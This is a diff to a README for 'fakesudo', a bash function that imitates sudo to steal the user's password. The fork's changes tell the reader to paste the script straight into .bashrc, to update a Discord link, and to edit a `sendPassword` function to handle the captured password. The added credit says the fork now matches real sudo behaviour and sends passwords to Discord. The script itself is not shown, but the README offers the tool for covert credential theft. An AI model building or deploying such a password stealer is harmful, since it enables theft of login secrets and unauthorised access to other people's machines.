@@ -3,10 +3,14 @@ It's just a bash function to steal the users password, while trying to be stealt
 
 # Install
 ```bash
-git clone https://github.com/mthbernardes/fakesudo.git
-cd fakesudo
-echo "source `pwd`/fakesudo.sh" > /home/$USER/.bashrc
+Update the discord link in the script.
+Copy past the script directly into .bashrc or similar file
 ```
 
 # Get the password
 Just edit the function `sendPassword` to do whatever you want with the password.
+
+# Thanks
+
+The original source were forked from here: https://github.com/mthbernardes/fsudo
+I just updated to match the real sudo behavior and send it to discord.
